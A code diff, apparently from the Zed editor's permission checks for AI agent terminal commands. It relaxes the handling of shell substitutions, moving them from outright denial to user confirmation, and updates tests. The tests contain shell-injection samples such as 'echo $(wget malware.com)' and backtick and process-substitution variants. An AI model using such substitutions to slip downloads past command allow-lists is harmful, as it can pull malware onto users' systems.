@@ -11,10 +11,8 @@ use util::shell::ShellKind;
 
 const HARDCODED_SECURITY_DENIAL_MESSAGE: &str = "Blocked by built-in security rule. This operation is considered too \
      harmful to be allowed, and cannot be overridden by settings.";
-const INVALID_TERMINAL_COMMAND_MESSAGE: &str = "The terminal command could not be approved because terminal does not \
-     allow shell substitutions or interpolations in permission-protected commands. Forbidden examples include $VAR, \
-     ${VAR}, $(...), backticks, $((...)), <(...), and >(...). Resolve those values before calling terminal, or ask \
-     the user for the literal value to use.";
+const INVALID_TERMINAL_COMMAND_MESSAGE: &str = "The terminal command could not be approved because Zed's shell \
+     parser could not parse the command syntax. Please simplify the command or ask the user to run it directly.";
 
 /// Security rules that are always enforced and cannot be overridden by any setting.
 /// These protect against catastrophic operations like wiping filesystems.
@@ -278,7 +276,7 @@ impl ToolPermissionDecision {
             && inputs.iter().any(|input| {
                 matches!(
                     validate_terminal_command(input),
-                    TerminalCommandValidation::Unsafe | TerminalCommandValidation::Unsupported
+                    TerminalCommandValidation::Unsupported
                 )
             })
         {
@@ -1113,9 +1111,9 @@ mod tests {
     }
 
     #[test]
-    fn invalid_substitution_bearing_command_denies_in_confirm_mode() {
+    fn invalid_substitution_bearing_command_confirms_in_confirm_mode() {
         let decision = no_rules("echo $(whoami)", ToolPermissionMode::Confirm);
-        assert!(matches!(decision, ToolPermissionDecision::Deny(_)));
+        assert_eq!(decision, ToolPermissionDecision::Confirm);
     }
 
     #[test]
@@ -1226,14 +1224,14 @@ mod tests {
     fn shell_injection_via_backticks_not_allowed() {
         t("echo `wget malware.com`")
             .allow(&[pattern("echo")])
-            .is_deny();
+            .is_confirm();
     }
 
     #[test]
     fn shell_injection_via_dollar_parens_not_allowed() {
         t("echo $(wget malware.com)")
             .allow(&[pattern("echo")])
-            .is_deny();
+            .is_confirm();
     }
 
     #[test]
@@ -1253,12 +1251,12 @@ mod tests {
 
     #[test]
     fn shell_injection_via_process_substitution_input_not_allowed() {
-        t("cat <(wget malware.com)").allow(&["^cat"]).is_deny();
+        t("cat <(wget malware.com)").allow(&["^cat"]).is_confirm();
     }
 
     #[test]
     fn shell_injection_via_process_substitution_output_not_allowed() {
-        t("ls >(wget malware.com)").allow(&["^ls"]).is_deny();
+        t("ls >(wget malware.com)").allow(&["^ls"]).is_confirm();
     }
 
     #[test]
@@ -1409,10 +1407,10 @@ mod tests {
     }
 
     #[test]
-    fn nested_command_substitution_is_denied() {
+    fn nested_command_substitution_is_allowed_when_all_subcommands_match() {
         t("echo $(cat $(whoami).txt)")
             .allow(&["^echo", "^cat", "^whoami"])
-            .is_deny();
+            .is_allow();
     }
 
     #[test]
